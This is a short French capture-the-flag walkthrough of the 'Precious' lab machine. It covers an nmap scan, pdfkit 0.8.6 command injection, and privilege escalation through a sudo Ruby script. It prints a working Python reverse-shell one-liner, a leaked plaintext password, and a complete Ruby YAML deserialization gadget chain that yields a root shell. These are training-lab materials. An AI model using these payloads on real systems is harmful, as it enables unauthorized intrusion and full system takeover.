# Precious - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-27 18:47 EST
Nmap scan report for 10.10.11.189
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
```

Arrivée sur un site qui permet de transformer une page en pdf, les pages classiques tels que [google.com](http://google.com) ne marchent pas ni la page en elle même : Cannot load remote URL!

En hostant des fichiers sur sa machine on peut fetch en pdf sur le site, on va donc essayer de faire une reverse shell

[https://mhmdiaa.com/blog/exploiting-html-imports/](https://mhmdiaa.com/blog/exploiting-html-imports/)

Pas de possibilité d’inclure un fichier dans le pdf via javascript, on remarque alors que le pdf est généré avec pdfkit 0.8.6 qui est vulnérable et exploitable via le paramètre `?name=%20`commande``

en plus de l’url. On utilise un reverse shell python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

On est connecté en tant que ruby

Dans le dossier caché .bundle dans le home de ruby, on trouve le mot de passe de henry dans le fichier config:

```bash
"henry:Q3c1AqGHtoI0aXAYFH"
```

On peut alors se connecter en SSH et obtenir le flag user

Il y a un SETUID énoncé comme tel : 

```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

Le but est donc de trouver un moyen pour exploiter ce SETUID

On se place dans notre home et on crée un dependencies.yaml

Il s’agit de faire une attack sur la deserialisation yaml par ruby

[Blind Remote Code Execution through YAML Deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

```bash
Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.

Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.
```

En suivant l’exemple du lien plus haut, on modifie le code pour obtenir un shell :

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c '/bin/sh'"
         method_id: :resolve
```

On obtient un shell root et on obtient le flag !
